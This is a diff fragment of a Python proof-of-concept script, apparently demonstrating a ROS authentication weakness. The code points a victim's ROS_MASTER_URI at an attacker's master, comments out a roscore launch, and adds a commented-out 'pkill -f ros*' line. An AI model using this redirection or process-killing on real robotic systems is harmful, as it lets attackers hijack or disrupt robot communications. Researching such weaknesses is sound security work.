@@ -96,8 +96,15 @@ def victim():
     os.system("export ROS_MASTER_URI=" + ATTACKER_ROS_MASTER_URI)
     os.system("export ROS_HOSTNAME=" + ATTACKER_ROS_HOSTNAME)
 
+    ##################
+    ## Starting roscore is not needed for this PoC, we are assuming it has already been ran "roscore -p 1337"
+    #Kill *all* ROS processes if it is already running -- not sure if this will work with rosrun?
+    #This is a dirty, dirty way of accomplishing this
+    #os.system("pkill -f ros*")
+
     #Get ROS core running on the proper port
-    os.system("roscore -p " + ROS_CORE_PORT)
+    #os.system("roscore -p " + ROS_CORE_PORT)
+    ##################
 
     #Setup the publisher (or talker)
     pub = rospy.Publisher('poc_auth', String, queue_size=10)
